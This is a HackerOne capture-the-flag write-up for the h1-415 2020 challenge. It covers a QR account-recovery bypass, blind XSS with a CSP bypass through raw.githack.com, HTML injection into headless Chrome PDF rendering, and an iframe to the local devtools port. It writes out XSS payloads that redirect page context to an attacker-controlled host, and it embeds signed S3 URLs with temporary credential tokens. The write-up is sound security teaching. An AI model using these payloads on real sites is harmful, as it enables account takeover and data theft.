{"id":779113,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzkxMTM=","url":"https://hackerone.com/reports/779113","title":"[h1-415 2020] @_bayotop h1-415-ctf writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-21T14:36:13.357Z","submitted_at":"2020-01-21T14:36:13.357Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bayotop","url":"/bayotop","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T22:32:09.744Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T22:32:09.707Z","team_member_agreed_on_going_public_at":"2020-02-03T20:36:01.013Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## TL;DR:\n\nThanks for the challenge!\n\n1. Abusing account recovery via QR codes to get access to jobert@mydocz.cosmic.\n2. Blind XSS in `/support/review/\u003creview_id\u003e` (including CSP bypass).\n3. Missing input sanitization on `name` parameter when POSTing to `/support/review/\u003creview_id\u003e`.\n4. Access to remote debugging port on local Chrome instance leaking ID of secret document.\n5. **h1ctf{y3s_1m_c0sm1c_n0w}**\n\nI also included a python script F691360 which is going through the whole challenge (it's a result of a number of scripts I used to automate repetitive tasks).\n\n## Details\n\n### Introduction\n\nhttps://h1-415.h1ctf.com hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user's name.\n\n### Step 1 - One '{' is all it takes.\n\nAfter a few attempts to include HTML in my user name (`\u003c` and `\u003e` were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. \n\nAfter a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:\n\n```\nascii_hex(user@example.com):\u003csome_random_secret_in_hex\u003e\n```\n\nAfter submitting the QR code to `/recover`, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip `{` (and any subsequent `{` and `}`) characters from the email when generating the QR code.\n\nThis meant that registering with `jobert@mydocz.cosmic{` would give back a valid QR code for `jobert@mydocz.cosmic`.\n\n### Step 2 - Wow that's cosmic.\n\nAfter logging in as `jobert@mydocz.cosmic` the support chat would became available as Jobert was a proper customer. The first thing I did was sending `flag` into the support chat. The response was as follows:\n\n```\n{\"response\":\"I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!\"}\n```\n\nThis response would led me to the deepest rabbit hole I've ever went down. \n\nAnyway, inspecting the JavaScript files included in the page, I learned that it's possible to end the chat with `quit` or `finish`. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.\n\nSubmitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:\n\n```\nContent-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n```\n\nSeeing that CSP instantly reminded me of [Micha≈Ç Bentkowski's tweet](https://twitter.com/SecurityMB/status/1162690916722839552). It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:\n\n```\n\u003cscript src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'\u003e\u003c/script\u003e\n```\n\nThe first payload that I used was `fetch('https://\u003cdomain-under-my-control\u003e')` to confirm the vulnerability. However, because of the `default-src` directive it wasn't possible to make connections other than to `self` (`connect-src`). I ended up bypassing this via `window.location = 'https://\u003cdomain-under-my-control\u003e'`.\n\nAs you can see [in my commit history](https://github.com/bayotop/playground/commits/master) I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and `window.location`.\n\n### Step 3 - One HTML injection isn't enough. \n\nThe DOM revealed that the support stuff had the ability to change a user's name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn't sanitized this time! This allowed to change a user's name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using `\u003ciframe src='https://\u003cdomain-under-my-control\u003e'\u003e\u003c/iframe\u003e`. Afterwards, I used a different payload - `\u003cscript\u003ewindow.location='http://ip-under-my-control'+window.location\u003c/script\u003e` - to learn the context I was in. \n\nIt was `http://localhost:3000/converter/\u003crandom-id\u003e.png?user_name=\u003cuser_name\u003e`. This meant that I couldn't simply access `file://`.\n\n### Step 4 - The \"secret\" was 9222.\n\nAt this point I got stuck for a long long time. I tried to find other services listening locally (using [aquatone's xlarge list](https://github.com/michenriksen/aquatone)). I was looking for parameter injection through the user name trying to inject `--allow-file-access-from-file` when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.\n\nI had a lightbulb moment: `I think someone is converting top secret documents as we speak!`. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user's username and email were `admin` and `admin@mydocz.cosmic`). It wasn't possible to recover into that account. It all made sense. I had to use the support staff's endpoint to change the admin's user name to `\u003cscript\u003ewindow.location='http://\u003cip-under-my-control\u003e'\u003c/script\u003e` and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal ([jobert's older tweet](https://twitter.com/jobertabma/status/1071091295425191937) was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.\n\nWhile doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:\n\n```\n/var/log/nginx/access.log ... \"GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=see_you_in_San_Francisco HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1\" ...\n```\n\nI'm super sorry for interfering! Hopefully I didn't cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).\n\nI started to realize this wouldn't work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks [@soiaxx](https://twitter.com/soiaxx)):\n\n```\nif it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:\nif you can run javascript :smile: so much ifs\n```\n\n*For the sake of transparency, it was a completely unrelated thread. I'm not sure if the involved parties knew about this particular CTF.*\n\nI tried setting my user name to `\u003ciframe width=900 height=900 src=\"http://localhost:9222/\"\u003e\u003c/iframe\u003e` and uploaded a file. It worked, it rendered two words: \"Inspectable WebContents\". [This StackOverflow answer](https://stackoverflow.com/a/29893173/5136654) mentions a `/json` endpoint showing available debug targets. Jackpot:\n\n{F691310}\n\nRequesting https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab would reveal the flag: **h1ctf{y3s_1m_c0sm1c_n0w}**.\n\n## Impact\n\nMostly sleep deprivation.","vulnerability_information_html":"\u003ch2 id=\"tl-dr\"\u003eTL;DR:\u003c/h2\u003e\n\n\u003cp\u003eThanks for the challenge!\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAbusing account recovery via QR codes to get access to \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eBlind XSS in \u003ccode\u003e/support/review/\u0026lt;review_id\u0026gt;\u003c/code\u003e (including CSP bypass).\u003c/li\u003e\n\u003cli\u003eMissing input sanitization on \u003ccode\u003ename\u003c/code\u003e parameter when POSTing to \u003ccode\u003e/support/review/\u0026lt;review_id\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAccess to remote debugging port on local Chrome instance leaking ID of secret document.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eh1ctf{y3s_1m_c0sm1c_n0w}\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI also included a python script \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"exploit.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eRxXzsN1hdYGJtVQwe38wL6z?response-content-disposition=attachment%3B%20filename%3D%22exploit.py%22%3B%20filename%2A%3DUTF-8%27%27exploit.py\u0026amp;response-content-type=text%2Fx-python-script\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065058Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=b8beed49d46caafa0fe398e7dc8b3808baee4ca280358032848ced808e3872ce\" data-attachment-type=\"text/x-python-script\"\u003eexploit.py (F691360)\u003c/a\u003e which is going through the whole challenge (it\u0026#39;s a result of a number of scripts I used to automate repetitive tasks).\u003c/p\u003e\n\n\u003ch2 id=\"details\"\u003eDetails\u003c/h2\u003e\n\n\u003ch3 id=\"introduction\"\u003eIntroduction\u003c/h3\u003e\n\n\u003cp\u003e\u003ca title=\"https://h1-415.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user\u0026#39;s name.\u003c/p\u003e\n\n\u003ch3 id=\"step-1-one-is-all-it-takes\"\u003eStep 1 - One \u0026#39;{\u0026#39; is all it takes.\u003c/h3\u003e\n\n\u003cp\u003eAfter a few attempts to include HTML in my user name (\u003ccode\u003e\u0026lt;\u003c/code\u003e and \u003ccode\u003e\u0026gt;\u003c/code\u003e were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. \u003c/p\u003e\n\n\u003cp\u003eAfter a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eascii_hex(user@example.com):\u0026lt;some_random_secret_in_hex\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter submitting the QR code to \u003ccode\u003e/recover\u003c/code\u003e, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip \u003ccode\u003e{\u003c/code\u003e (and any subsequent \u003ccode\u003e{\u003c/code\u003e and \u003ccode\u003e}\u003c/code\u003e) characters from the email when generating the QR code.\u003c/p\u003e\n\n\u003cp\u003eThis meant that registering with \u003ccode\u003ejobert@mydocz.cosmic{\u003c/code\u003e would give back a valid QR code for \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"step-2-wow-that-s-cosmic\"\u003eStep 2 - Wow that\u0026#39;s cosmic.\u003c/h3\u003e\n\n\u003cp\u003eAfter logging in as \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e the support chat would became available as Jobert was a proper customer. The first thing I did was sending \u003ccode\u003eflag\u003c/code\u003e into the support chat. The response was as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;response\u0026quot;:\u0026quot;I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis response would led me to the deepest rabbit hole I\u0026#39;ve ever went down. \u003c/p\u003e\n\n\u003cp\u003eAnyway, inspecting the JavaScript files included in the page, I learned that it\u0026#39;s possible to end the chat with \u003ccode\u003equit\u003c/code\u003e or \u003ccode\u003efinish\u003c/code\u003e. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.\u003c/p\u003e\n\n\u003cp\u003eSubmitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eContent-Security-Policy: default-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSeeing that CSP instantly reminded me of \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSecurityMB%2Fstatus%2F1162690916722839552\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMicha≈Ç Bentkowski\u0026#39;s tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script src=\u0026#39;https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe first payload that I used was \u003ccode\u003efetch(\u0026#39;https://\u0026lt;domain-under-my-control\u0026gt;\u0026#39;)\u003c/code\u003e to confirm the vulnerability. However, because of the \u003ccode\u003edefault-src\u003c/code\u003e directive it wasn\u0026#39;t possible to make connections other than to \u003ccode\u003eself\u003c/code\u003e (\u003ccode\u003econnect-src\u003c/code\u003e). I ended up bypassing this via \u003ccode\u003ewindow.location = \u0026#39;https://\u0026lt;domain-under-my-control\u0026gt;\u0026#39;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAs you can see \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbayotop%2Fplayground%2Fcommits%2Fmaster\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ein my commit history\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and \u003ccode\u003ewindow.location\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"step-3-one-html-injection-isn-t-enough\"\u003eStep 3 - One HTML injection isn\u0026#39;t enough.\u003c/h3\u003e\n\n\u003cp\u003eThe DOM revealed that the support stuff had the ability to change a user\u0026#39;s name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn\u0026#39;t sanitized this time! This allowed to change a user\u0026#39;s name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using \u003ccode\u003e\u0026lt;iframe src=\u0026#39;https://\u0026lt;domain-under-my-control\u0026gt;\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e. Afterwards, I used a different payload - \u003ccode\u003e\u0026lt;script\u0026gt;window.location=\u0026#39;http://ip-under-my-control\u0026#39;+window.location\u0026lt;/script\u0026gt;\u003c/code\u003e - to learn the context I was in. \u003c/p\u003e\n\n\u003cp\u003eIt was \u003ccode\u003ehttp://localhost:3000/converter/\u0026lt;random-id\u0026gt;.png?user_name=\u0026lt;user_name\u0026gt;\u003c/code\u003e. This meant that I couldn\u0026#39;t simply access \u003ccode\u003efile://\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"step-4-the-secret-was-9222\"\u003eStep 4 - The \u0026quot;secret\u0026quot; was 9222.\u003c/h3\u003e\n\n\u003cp\u003eAt this point I got stuck for a long long time. I tried to find other services listening locally (using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmichenriksen%2Faquatone\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eaquatone\u0026#39;s xlarge list\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). I was looking for parameter injection through the user name trying to inject \u003ccode\u003e--allow-file-access-from-file\u003c/code\u003e when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.\u003c/p\u003e\n\n\u003cp\u003eI had a lightbulb moment: \u003ccode\u003eI think someone is converting top secret documents as we speak!\u003c/code\u003e. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user\u0026#39;s username and email were \u003ccode\u003eadmin\u003c/code\u003e and \u003ccode\u003eadmin@mydocz.cosmic\u003c/code\u003e). It wasn\u0026#39;t possible to recover into that account. It all made sense. I had to use the support staff\u0026#39;s endpoint to change the admin\u0026#39;s user name to \u003ccode\u003e\u0026lt;script\u0026gt;window.location=\u0026#39;http://\u0026lt;ip-under-my-control\u0026gt;\u0026#39;\u0026lt;/script\u0026gt;\u003c/code\u003e and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal (\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fjobertabma%2Fstatus%2F1071091295425191937\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejobert\u0026#39;s older tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.\u003c/p\u003e\n\n\u003cp\u003eWhile doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/var/log/nginx/access.log ... \u0026quot;GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1\u0026quot; ...\n/var/log/nginx/access.log ... \u0026quot;GET /?x=see_you_in_San_Francisco HTTP/1.1\u0026quot; ...\n/var/log/nginx/access.log ... \u0026quot;GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1\u0026quot; ...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m super sorry for interfering! Hopefully I didn\u0026#39;t cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).\u003c/p\u003e\n\n\u003cp\u003eI started to realize this wouldn\u0026#39;t work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fsoiaxx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@soiaxx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif it\u0026#39;s chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:\nif you can run javascript :smile: so much ifs\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eFor the sake of transparency, it was a completely unrelated thread. I\u0026#39;m not sure if the involved parties knew about this particular CTF.\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eI tried setting my user name to \u003ccode\u003e\u0026lt;iframe width=900 height=900 src=\u0026quot;http://localhost:9222/\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e and uploaded a file. It worked, it rendered two words: \u0026quot;Inspectable WebContents\u0026quot;. \u003ca href=\"/redirect?url=https%3A%2F%2Fstackoverflow.com%2Fa%2F29893173%2F5136654\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eThis StackOverflow answer\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e mentions a \u003ccode\u003e/json\u003c/code\u003e endpoint showing available debug targets. Jackpot:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"debug-json.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4fmzsc6rwuxakCkALxMLWoMo?response-content-disposition=attachment%3B%20filename%3D%22debug-json.png%22%3B%20filename%2A%3DUTF-8%27%27debug-json.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065058Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=dc4ec23acc1cba7c58acb6051370054e9d497ae59522a3f33768441e718418f3\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4fmzsc6rwuxakCkALxMLWoMo?response-content-disposition=attachment%3B%20filename%3D%22debug-json.png%22%3B%20filename%2A%3DUTF-8%27%27debug-json.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065058Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmz